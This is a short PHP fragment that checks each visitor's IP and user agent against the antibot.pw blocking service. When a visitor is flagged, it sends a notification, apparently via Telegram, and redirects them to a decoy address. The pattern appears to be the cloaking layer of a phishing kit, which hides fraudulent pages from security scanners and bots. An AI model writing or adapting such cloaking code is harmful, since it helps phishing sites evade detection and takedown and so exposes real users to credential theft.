<?php
$agentpw = (urlencode($_SERVER["HTTP_USER_AGENT"]));
$resp_pw = curll("https://antibot.pw/api/v2-blockers?ip=" . $remoteip . "&apikey=" . $antibotpw_api . "&ua=" . $agentpw);
$pw_data = json_decode($resp_pw);
if ($pw_data->{'block_access'}) {
    $info_pw = $respo->geoplugin_request . ' from ' . $respo->geoplugin_countryName . ' was blocked by antibot.pw ';
    if ($full_notification) {
        teleg($info_pw);
    }
    header('Location: ' . faker());
    exit();
} ?>